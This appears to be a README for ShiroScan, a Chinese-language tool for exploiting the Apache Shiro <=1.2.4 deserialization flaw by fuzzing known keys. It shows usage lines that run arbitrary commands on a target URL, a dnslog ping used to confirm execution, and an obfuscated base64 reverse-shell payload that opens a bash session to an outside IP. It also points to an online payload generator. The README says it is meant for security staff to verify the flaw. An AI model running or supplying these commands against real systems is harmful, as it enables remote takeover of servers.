# ShiroScan
Shiro&lt;=1.2.4反序列化，一键检测工具

```
集成21个key进行fuzz
```

如果有帮助，请点个star哦，blog：www.svenbeast.com
    
    pip3 install -r requirments.txt     

    Usage：python3 shiro.py  url  command

    Usage：python3 shiro.py  http://url.com  whoami

http://www.dnslog.cn/   验证推荐使用这个dnslog平台，速度比ceye.io要快很多
执行的命令带空格记得用""引起来

    usage：python3 shiro.py  http://url.com  "ping dnslog.cn"
    
7个模块全部跑一遍,然后去dnslog平台查看是否收到请求，不出来就GG，也可能是因为编码还不够多
请自行收集编码，在moule下的源代码中自行添加方法即可

反弹shell命令：

    python3 shiro_rce.py http://2.2.2.2:8180 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjIuMy40Lzg5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}"
解析：

    http://2.2.2.2:8180 为存在漏洞的网址

    bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjIuMy40Lzg5OTkgMD4mMQ==}|{base64,-d}|{bash,-i} 为需要执行的命令

可以使用这个网址在线生成：http://www.jackson-t.ca/runtime-exec-payloads.html

## 不推荐当做exp使用，效率问题
## 仅供安全人员验证,测试是否存在此漏洞

Windows安装Crypto，可以直接使用下面的命令：

    pip install crypto pycryptodome
    pip uninstall crypto pycryptodome
    pip install pycryptodome

而如果你是linux环境，则直接安装pycryptodome即可：

    pip install pycryptodome
